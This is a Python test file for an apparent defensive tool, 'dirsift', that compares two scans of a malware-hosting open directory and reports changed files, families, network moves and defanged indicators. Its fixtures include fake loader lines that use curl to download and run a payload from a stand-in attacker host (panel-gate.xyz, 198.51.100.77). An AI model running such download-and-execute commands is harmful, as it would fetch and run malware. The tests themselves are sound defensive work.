"""Two runs of one directory, a week apart, and what changed between them.

The comparison has to be careful in the same places the scan is: it never goes
out, it never prints a live indicator, and it never calls a file removed when
the second walk simply did not get that far.
"""

from __future__ import annotations

from datetime import UTC, datetime
from pathlib import Path

from typer.testing import CliRunner

from dirsift import cli
from dirsift.analyze import analyze
from dirsift.asn import AsnTable
from dirsift.diff import (
    BYTES_DIFFER,
    CANNOT_TELL,
    LISTING_CHANGED,
    RunDiff,
    diff_runs,
    render_diff_markdown,
)
from dirsift.models import Entry, ScanError, ScanResult

runner = CliRunner()

ROOT = "http://203.0.113.24/files/"
CALLBACK = "http://panel-gate.xyz/gate.php"
FIRST = datetime(2026, 10, 1, 9, 0, tzinfo=UTC)
LATER = datetime(2026, 10, 8, 9, 0, tzinfo=UTC)


def file(path: str, root: str = ROOT, **kw) -> Entry:
    """A file under ``root``, with its parent folder set the way the walker sets it."""
    folder, _, name = path.rpartition("/")
    defaults = {"kind": "pe", "fetched_bytes": 4096, "depth": path.count("/") + 1}
    defaults.update(kw)
    return Entry(
        url=root + path,
        name=name,
        parent_url=root + (folder + "/" if folder else ""),
        **defaults,
    )


def folder(path: str, root: str = ROOT) -> Entry:
    parent, _, name = path.rstrip("/").rpartition("/")
    return Entry(
        url=root + path.rstrip("/") + "/",
        name=name,
        is_dir=True,
        depth=path.count("/"),
        parent_url=root + (parent + "/" if parent else ""),
    )


def run(entries: list[Entry], started: datetime = FIRST, root: str = ROOT, **kw) -> ScanResult:
    result = ScanResult(
        root_url=root, started_at=started, listing_flavor="apache", entries=entries, **kw
    )
    analyzed, _ = analyze(result, asn_table=AsnTable())
    return analyzed


def loader(**kw) -> Entry:
    defaults = {
        "kind": "script",
        "fetched_bytes": 80,
        "sha256": "a" * 64,
        "text_preview": "curl -o svc4.exe " + CALLBACK + "\nstart svc4.exe\n",
    }
    defaults.update(kw)
    return file("install.bat", **defaults)


def baseline() -> list[Entry]:
    return [
        loader(),
        file("svc3.exe", sha256="3" * 64),
        file("svc4.exe", sha256="4" * 64),
        folder("bin/"),
        file("bin/tool.exe", sha256="5" * 64),
    ]


# -- nothing changed ---------------------------------------------------------


def test_two_identical_runs_report_nothing():
    diff = diff_runs(run(baseline()), run(baseline(), LATER))
    assert not diff.changed_anything
    assert diff.unchanged.files_same_bytes == 4
    assert diff.unchanged.dirs == 1
    assert diff.notes == []


def test_two_identical_runs_make_a_one_sentence_report():
    markdown = render_diff_markdown(diff_runs(run(baseline()), run(baseline(), LATER)))
    body = [line for line in markdown.splitlines() if line and not line.startswith("#")]
    assert len(body) == 1
    assert body[0].startswith("Nothing changed")


# -- files -------------------------------------------------------------------


def test_an_added_a_removed_and_a_changed_file():
    old = run(baseline())
    entries = [e for e in baseline() if e.name != "svc3.exe"]
    entries = [file("svc4.exe", sha256="9" * 64) if e.name == "svc4.exe" else e for e in entries]
    entries.append(file("svc5.exe", sha256="6" * 64))
    diff = diff_runs(old, run(entries, LATER))

    assert [ref.path for ref in diff.added] == ["svc5.exe"]
    assert [ref.path for ref in diff.removed] == ["svc3.exe"]
    assert [(c.path, c.verdict) for c in diff.changed] == [("svc4.exe", BYTES_DIFFER)]


def test_a_file_without_a_hash_on_one_side_is_never_called_changed_by_hash():
    """A head is not the file. Without both digests the bytes were not compared."""
    old = run([file("svc4.exe", sha256="4" * 64, size=4096)])
    cut = file("svc4.exe", truncated=True, size=4096)
    assert diff_runs(old, run([cut], LATER)).changed == []

    grown = file("svc4.exe", truncated=True, size=9000)
    (change,) = diff_runs(old, run([grown], LATER)).changed
    assert change.verdict == LISTING_CHANGED

    unknown = file("svc4.exe", truncated=True)
    (change,) = diff_runs(old, run([unknown], LATER)).changed
    assert change.verdict == CANNOT_TELL


def test_a_kind_change_is_caught():
    old = run([file("invoice.pdf", kind="document", sha256="1" * 64)])
    new = run([file("invoice.pdf", kind="pe", sha256="2" * 64)], LATER)
    (kind,) = diff_runs(old, new).kind_changes
    assert (kind.path, kind.old_kind, kind.new_kind) == ("invoice.pdf", "document", "pe")


# -- families ----------------------------------------------------------------


def test_a_family_that_gains_a_build_and_loses_one():
    old = run([file(f"svc{n}.exe", sha256=str(n) * 64) for n in (3, 4, 5)])
    new = run([file(f"svc{n}.exe", sha256=str(n) * 64) for n in (4, 5, 7)], LATER)
    (family,) = diff_runs(old, new).families
    assert family.label == "svc{n}.exe"
    assert family.added == ["svc7.exe"]
    assert family.pulled == ["svc3.exe"]


def test_a_family_that_appears_and_one_that_vanishes():
    old = run([file("a1.exe"), file("a2.exe")])
    new = run([file("b1.dll"), file("b2.dll")], LATER)
    statuses = {f.label: f.status for f in diff_runs(old, new).families}
    assert statuses == {"a{n}.exe": "vanished", "b{n}.dll": "appeared"}


# -- coverage ----------------------------------------------------------------


def test_a_file_in_a_folder_the_newer_run_did_not_walk_is_not_seen_not_removed():
    """A shallower second walk is not a deletion."""
    new_entries = [e for e in baseline() if not e.url.endswith("tool.exe")]
    new = run(
        new_entries,
        LATER,
        options={"depth": 0},
        errors=[ScanError(url=ROOT, stage="walk", detail="request budget exhausted")],
    )
    diff = diff_runs(run(baseline(), options={"depth": 2}), new)
    assert [ref.path for ref in diff.not_seen_in_new] == ["bin/tool.exe"]
    assert diff.removed == []
    assert any("depth was 2" in note for note in diff.notes)
    assert any("request budget exhausted" in note for note in diff.notes)


def test_a_file_in_a_folder_that_is_gone_entirely_is_removed():
    new_entries = [e for e in baseline() if "bin" not in e.url]
    diff = diff_runs(run(baseline()), run(new_entries, LATER))
    assert {ref.path for ref in diff.removed} == {"bin/", "bin/tool.exe"}
    assert diff.not_seen_in_new == []


def test_a_file_only_the_newer_run_reached_is_not_called_added():
    old_entries = [e for e in baseline() if not e.url.endswith("tool.exe")]
    diff = diff_runs(run(old_entries), run(baseline(), LATER))
    assert [ref.path for ref in diff.not_seen_in_old] == ["bin/tool.exe"]
    assert diff.added == []


def test_a_run_whose_root_failed_claims_no_removals():
    failed = ScanResult(
        root_url=ROOT,
        started_at=LATER,
        errors=[ScanError(url=ROOT, stage="walk", detail="HTTP 503 Service Unavailable")],
    )
    diff = diff_runs(run(baseline()), failed)
    assert diff.removed == []
    assert len(diff.not_seen_in_new) == 5
    assert any("could not list 1 folder" in note for note in diff.notes)


# -- indicators --------------------------------------------------------------


def test_indicators_added_and_removed_are_printed_defanged_only():
    old = run(baseline())
    swapped = loader(text_preview="curl http://198.51.100.77:8443/stage2\n")
    new = run([swapped] + baseline()[1:], LATER)
    diff = diff_runs(old, new)

    assert {row.defanged for row in diff.indicators_removed} >= {
        "hxxp://panel-gate[.]xyz/gate[.]php"
    }
    assert "198[.]51[.]100[.]77:8443" in {row.defanged for row in diff.indicators_added}

    markdown = render_diff_markdown(diff)
    dumped = diff.model_dump_json()
    for live in (CALLBACK, "panel-gate.xyz", "198.51.100.77"):
        assert live not in markdown
        assert live not in dumped


def test_an_indicator_in_a_file_the_newer_run_did_not_read_is_not_called_removed():
    unread = loader(text_preview=None, sha256=None, truncated=True)
    diff = diff_runs(run(baseline()), run([unread] + baseline()[1:], LATER))
    assert diff.indicators_removed == []
    assert "hxxp://panel-gate[.]xyz/gate[.]php" in {
        row.defanged for row in diff.indicators_not_compared
    }


# -- the server and the entry point --------------------------------------------


def test_a_target_that_moved_network_leads_the_server_section():
    old = run(baseline(), target_asn=64496, target_as_name="EXAMPLE-HOSTING")
    new = run(baseline(), LATER, target_asn=64511, target_as_name="LATER-HOSTING")
    diff = diff_runs(old, new)
    assert diff.asn_moved
    assert {"target_asn", "target_as_name"} <= {change.field for change in diff.server}

    markdown = render_diff_markdown(diff)
    server = markdown.index("## Server")
    assert "AS64496" in markdown[server:]
    assert "AS64511" in markdown[server:]
    assert "moved" in markdown[server:].splitlines()[2].lower()


def test_a_new_driver_is_reported_with_the_old_one():
    old = run(baseline())
    runner_script = file(
        "run.bat",
        kind="script",
        sha256="7" * 64,
        text_preview="start svc3.exe\nstart svc4.exe\nstart bin/tool.exe\nschtasks /create\n",
    )
    quiet_loader = loader(text_preview="echo hi\n", sha256="8" * 64)
    diff = diff_runs(old, run([quiet_loader, runner_script] + baseline()[1:], LATER))
    assert diff.entry_point is not None
    assert diff.entry_point.old_path == "install.bat"
    assert diff.entry_point.new_path == "run.bat"


# -- order and roots -----------------------------------------------------------


def test_runs_given_newest_first_are_put_back_in_order():
    old = run(baseline())
    new = run(baseline() + [file("svc5.exe", sha256="6" * 64)], LATER)
    diff = diff_runs(new, old)
    assert diff.swapped
    assert [ref.path for ref in diff.added] == ["svc5.exe"]
    assert any("newest first" in note for note in diff.notes)


def test_a_different_root_is_warned_about_and_still_compared():
    other = "http://203.0.113.99/files/"
    moved = [
        file("install.bat", other, kind="script", sha256="a" * 64),
        file("svc3.exe", other, sha256="3" * 64),
        file("svc4.exe", other, sha256="9" * 64),
    ]
    diff = diff_runs(run(baseline()), run(moved, LATER, root=other))
    assert diff.roots_differ
    assert [c.path for c in diff.changed] == ["svc4.exe"]
    markdown = render_diff_markdown(diff)
    first_section = markdown.split("\n## ")[0]
    assert "different root" in first_section.lower()


def test_hostile_filenames_reach_the_report_intact():
    names = ["отчет.exe", "фатура.pdf", "ödeme_şekli.bat"]
    old = run([file(name, sha256=str(i) * 64) for i, name in enumerate(names)])
    new = run([file(names[0], sha256="9" * 64)], LATER)
    markdown = render_diff_markdown(diff_runs(old, new))
    for name in names:
        assert name in markdown
    assert markdown.encode("utf-8").decode("utf-8") == markdown


def test_percent_encoded_names_are_compared_and_shown_decoded():
    encoded = file("%D0%BE%D1%82%D1%87%D0%B5%D1%82.exe", sha256="1" * 64)
    plain = file("отчет.exe", sha256="2" * 64)
    (change,) = diff_runs(run([encoded]), run([plain], LATER)).changed
    assert change.path == "отчет.exe"


def test_the_comparison_survives_a_round_trip_through_json():
    diff = diff_runs(run(baseline()), run(baseline()[:2], LATER))
    again = RunDiff.model_validate_json(diff.model_dump_json())
    assert again == diff


# -- the command -------------------------------------------------------------


def save(tmp_path: Path, name: str, result: ScanResult) -> Path:
    path = tmp_path / name
    path.write_text(result.model_dump_json(indent=2), encoding="utf-8")
    return path


def pair_on_disk(tmp_path: Path) -> tuple[Path, Path]:
    old = save(tmp_path, "old.json", run(baseline()))
    new_entries = baseline() + [file("ödeme_şekli.exe", sha256="6" * 64)]
    new = save(tmp_path, "new.json", run(new_entries, LATER))
    return old, new


def test_diff_prints_markdown_to_stdout(tmp_path: Path, monkeypatch):
    monkeypatch.delenv("DIRSIFT_NO_BANNER", raising=False)
    old, new = pair_on_disk(tmp_path)
    reply = runner.invoke(cli.app, ["diff", str(old), str(new)])
    assert reply.exit_code == 0, reply.stdout
    assert reply.stdout.startswith("# ")
    assert "ödeme_şekli.exe" in reply.stdout
    # The banner is printed, on stderr, so a pipe gets only the markdown.
    assert "someoneleftthelightson" in reply.stderr.replace(" ", "")
    assert "someoneleftthelightson" not in reply.stdout.replace(" ", "")


def test_diff_writes_the_report_and_the_json_as_utf8(tmp_path: Path):
    old, new = pair_on_disk(tmp_path)
    out = tmp_path / "changes" / "changes.md"
    data = tmp_path / "changes" / "changes.json"
    reply = runner.invoke(
        cli.app, ["diff", str(old), str(new), "-o", str(out), "--json", str(data)]
    )
    assert reply.exit_code == 0, reply.stdout
    assert "ödeme_şekli.exe" in out.read_text(encoding="utf-8")
    parsed = RunDiff.model_validate_json(data.read_text(encoding="utf-8"))
    assert [ref.path for ref in parsed.added] == ["ödeme_şekli.exe"]


def test_diff_json_alone_leaves_stdout_to_the_markdown(tmp_path: Path):
    old, new = pair_on_disk(tmp_path)
    data = tmp_path / "changes.json"
    reply = runner.invoke(cli.app, ["diff", str(old), str(new), "--json", str(data)])
    assert reply.exit_code == 0
    assert reply.stdout.startswith("# ")
    assert str(data) not in reply.stdout
    assert data.exists()


def test_diff_with_a_missing_run_is_a_sentence(tmp_path: Path):
    old, _ = pair_on_disk(tmp_path)
    reply = runner.invoke(cli.app, ["diff", str(old), str(tmp_path / "nope.json")])
    assert reply.exit_code == 2
    assert "nope.json" in reply.stdout
    assert "Traceback" not in reply.stdout


def test_diff_never_opens_a_connection(tmp_path: Path, monkeypatch):
    import httpx

    class NoNetwork:
        def __init__(self, *args, **kwargs):
            raise AssertionError("diff tried to open an HTTP client")

    monkeypatch.setattr(httpx, "Client", NoNetwork)
    monkeypatch.setattr(httpx, "AsyncClient", NoNetwork)
    old, new = pair_on_disk(tmp_path)
    reply = runner.invoke(cli.app, ["diff", str(old), str(new)])
    assert reply.exit_code == 0, reply.stdout


def test_two_runs_that_listed_nothing_do_not_claim_nothing_changed():
    """Seen on a real host: both walks were refused at the root."""

    def refused(started: datetime) -> ScanResult:
        return ScanResult(
            root_url=ROOT,
            started_at=started,
            errors=[ScanError(url=ROOT, stage="walk", detail="HTTP 503 Service Unavailable")],
        )

    markdown = render_diff_markdown(diff_runs(refused(FIRST), refused(LATER)))
    assert "Nothing changed" not in markdown
    assert "Nothing to compare" in markdown
    assert "neither run" in markdown.lower()


def test_being_given_newest_first_is_said_once():
    markdown = render_diff_markdown(diff_runs(run(baseline(), LATER), run(baseline())))
    assert markdown.lower().count("newest first") == 1
